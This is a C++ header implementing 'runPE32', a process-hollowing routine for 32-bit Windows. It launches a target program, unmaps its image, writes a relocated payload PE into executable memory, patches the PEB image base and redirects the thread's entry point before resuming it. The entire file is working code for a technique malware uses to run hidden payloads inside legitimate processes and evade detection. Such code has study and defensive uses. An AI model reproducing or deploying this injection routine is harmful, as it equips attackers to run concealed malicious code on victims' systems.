#pragma once

#include <windows.h>
#include <stdio.h>

#include "ntdll_undoc.h"
#include "createproc.h"
#include "relocate.h"
#include "pe_raw_to_virtual.h"

bool is_system32b()
{
    if (sizeof(LPVOID) == sizeof(DWORD)) {
        return true;
    }
    return false;
}

/*
runPE32:
    targetPath - application where we want to inject
    payload - buffer with raw image of PE that we want to inject
    payload_size - size of the above

    desiredBase - address where we want to map the payload in the target memory; NULL if we don't care. 
        This address will be ignored if the payload has no relocations table, because then it must be mapped to it's original ImageBase.
    unmap_target - do we want to unmap the target? (we are not forced to do it if it doesn't disturb our chosen base)
*/
bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desiredBase = NULL, bool unmap_target = false)
{
    if (!load_ntdll_functions()) return false;

    //check payload:
    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
    if (payload_nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }

    const SIZE_T kPtrSize = sizeof(LPVOID);
    if (kPtrSize != sizeof(DWORD)) {
        printf("System is not 32 bit\n");
        //TODO: support 64 bit
        return false;
    }

    const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
    DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;

    //create target process:
    PROCESS_INFORMATION pi;
    if (!create_new_process1(targetPath, pi)) return false;
    printf("PID: %d\n", pi.dwProcessId);

    //get initial context of the target:
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &context);
    
    //get image base of the target:
    DWORD targetImageBase;
    DWORD PEB = context.Ebx;

    if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB + 8), &targetImageBase, kPtrSize, NULL)) {
        return false;
    }
    printf("targetImageBase = %x\n", targetImageBase);

    if (has_relocations(payload) == false) {
        //payload have no relocations, so we are bound to use it's original image base
        desiredBase = payload_nt_hdr->OptionalHeader.ImageBase;
    }
    
    if (unmap_target || targetImageBase == desiredBase) {
        //unmap the target:
        if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)targetImageBase) != ERROR_SUCCESS) {
            printf("Unmapping the target failed!\n");
            return false;
        }
    }
    
    //try to allocate space that will be the most suitable for the payload:
    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, (LPVOID) desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
    printf("Allocated remote ImageBase: %p size: %x\n", remoteAddress,  payloadImageSize);

    //change the image base saved in headers - this is very important for loading imports:
    payload_nt_hdr->OptionalHeader.ImageBase = (DWORD) remoteAddress;

    //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
    //when it will be ready, we will copy it into the space reserved in the target process

    LPVOID localCopyAddress = VirtualAlloc(NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);;
    if (localCopyAddress == NULL) {
        printf("Could not allocate memory in the current process\n");
        return false;
    }
    printf("Allocated local memory: %p size: %x\n", localCopyAddress,  payloadImageSize);

    if (!copy_pe_to_virtual_l(payload, payload_size, localCopyAddress)) {
        printf("Could not copy PE file\n");
        return false;
    }

    //if the base address of the payload changed, we need to apply relocations:
    if ((LONG)remoteAddress != oldImageBase) {
        if (apply_relocations((LONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
            printf("[ERROR] Could not relocate image!\n");
            return false;
        }
    }

     DWORD written = 0;
    // paste the local copy of the prepared image into the reserved space inside the remote process:
    if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
        printf("[ERROR] Could not paste the image into remote process!\n");
        return false;
    }
    //free the localy allocated copy
    VirtualFree(localCopyAddress, payloadImageSize, MEM_FREE);

    //overwrite ImageBase stored in PEB
    if (!WriteProcessMemory(pi.hProcess, LPVOID(PEB + 8), &remoteAddress, kPtrSize, &written) || written != kPtrSize) {
        printf("Failed overwriting PEB: %d\n", written);
        return false;
    }

    //overwrite context: set new Entry Point
    DWORD newEP = (DWORD) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint;
    printf("newEP: %p\n", newEP);
    context.Eax = newEP;
    SetThreadContext(pi.hThread, LPCONTEXT(&context));

    //start the injected:
    printf("--\n");
    ResumeThread(pi.hThread);

    //free the handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}
